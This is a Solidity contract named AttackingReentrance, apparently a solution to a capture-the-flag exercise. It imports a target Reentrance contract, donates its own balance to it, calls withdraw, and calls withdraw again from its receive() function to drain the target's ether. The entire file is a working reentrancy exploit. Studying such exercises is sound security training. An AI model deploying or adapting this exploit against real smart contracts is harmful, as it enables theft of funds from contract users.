// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance reentrance;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        reentrance = Reentrance(_contractAddress);
    }

    function hackContract() external {
        // Code me!        
        address hacker_address = address(this);
        reentrance.donate{value: hacker_address.balance}(hacker_address);
        reentrance.withdraw();
    }

    /**
     * contract can have one receive function that executes whenever 
     * some eth is received 
     */
    receive() external payable {
        reentrance.withdraw();
    }
}
